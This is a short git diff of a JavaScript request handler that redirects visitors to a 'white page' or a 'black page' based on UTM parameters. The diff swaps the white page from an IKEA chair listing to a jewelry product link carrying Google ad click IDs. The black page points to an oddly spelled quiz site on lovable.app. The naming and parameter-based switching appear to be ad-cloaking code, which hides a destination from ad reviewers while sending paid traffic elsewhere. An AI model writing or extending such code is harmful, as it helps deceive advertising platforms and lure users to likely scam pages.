@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.ikea.com/at/en/p/skogsta-chair-black-50544867/";
+    const whitePageURL = "https://www.beyaly.com/18k-gold-plated-zircon-elegant-bling-ring-fashionable-chain-design-for-women?_gl=1*1bbu1kx*_up*MQ..*_gs*MQ..&gclid=CjwKCAjwjffHBhBuEiwAKMb8pCHX0fR-n6PZLucJXSdRuHqPQgD3BPqfCx6bKiXDKuH1kq3OPnyIlxoC7CcQAvD_BwE&gbraid=0AAAAApylhvS0xPDiFIkMa7fR7dqBIdkj4";
     const blackPageURL = "https://instentquzzz.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,4 +26,5 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
